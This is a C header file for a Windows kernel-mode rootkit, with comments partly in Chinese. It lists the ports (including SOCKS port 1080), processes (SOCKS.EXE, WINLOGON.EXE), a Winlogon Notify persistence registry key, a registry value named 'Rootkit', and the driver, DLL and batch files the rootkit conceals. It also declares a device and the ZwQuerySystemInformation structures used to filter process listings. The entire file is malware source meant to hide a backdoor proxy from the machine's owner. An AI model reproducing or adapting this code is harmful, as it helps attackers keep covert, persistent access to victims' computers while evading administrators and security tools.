#ifndef cfg
#define cfg

#define dbg(_X_) KdPrint((_X_))
#define Dbg(_X_) KdPrint((_X_))

int PTNUM=2;
int PORTTOHIDE[]={ 3240,1080,0 };

// 需隐藏的主键名
WCHAR HideKeyName[] =  L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\WinFileSupport\\";

PCHAR ProcessToHide[]={"WINLOGON.EXE","SOCKS.EXE",""};
ULONG NbProcessToHide=2;

typedef struct _DEVICE_EXTENSION {
	 KEVENT EventObject;    //事件对象EventObject
   PKTHREAD	ThreadObject; //线程对象
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

//隐藏注册表键
//////////////////////////////////////////////////////////////////////
PCWSTR HideKey = L"Rootkit";   //需要隐藏的注册表值

#define NbFileToHide 3   //需要隐藏的文件数目
PCHAR HideDirFile[] = { "WinFileSys.sys", "WinComSpt.dll","t.bat" };//需要隐藏的文件
//////////////////////////////////////////////////////////////////////
   
const WCHAR deviceNameBuffer[] = L"\\Device\\filesuppt";
const WCHAR deviceLinkBuffer[] = L"\\DosDevices\\filesuppt";

#define Dbg(_X_) KdPrint((_X_))

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateSection(
     OUT PHANDLE SectionHandle,
     IN ACCESS_MASK DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     IN PLARGE_INTEGER SectionSize OPTIONAL,
     IN ULONG Protect,
     IN ULONG Attributes,
     IN HANDLE FileHandle
     );

#ifndef _PROCESS_H_
  #define _PROCESS_H_

typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
     ULONG SystemInformationCLass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength
);

// this is in process struct 
typedef struct _SYSTEM_THREAD_INFORMATION
{
        LARGE_INTEGER           KernelTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           CreateTime;
        ULONG                   WaitTime;
        PVOID                   StartAddress;
        CLIENT_ID               ClientIs;
        KPRIORITY               Priority;
        KPRIORITY               BasePriority;
        ULONG                   ContextSwitchCount;
        ULONG                   ThreadState;
        KWAIT_REASON            WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG           NextEntryDelta;         // next process offset
    ULONG           ThreadCount;            // thread number
    ULONG           Reserved1[6];           // reserved
    LARGE_INTEGER   CreateTime;             // process creation time
    LARGE_INTEGER   UserTime;               // user mode time of the process
    LARGE_INTEGER   KernelTime;             // kernel mode time
    UNICODE_STRING  ProcessName;            // process name
    KPRIORITY       BasePriority;           // priority
    ULONG           ProcessId;              // pid
    ULONG           InheritedFromProcessId; // ppid
    ULONG           HandleCount;            // handles number
    ULONG           Reserved2[2];           // reserved
    VM_COUNTERS     VmCounters;             // virtual memory counter
#if _WIN32_WINNT >= 0x500                   
    IO_COUNTERS     IoCounters;             // I/O counter (win2k)
#endif
    SYSTEM_THREAD_INFORMATION Threads[1];   // process thread
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

#endif

#endif	//cfg
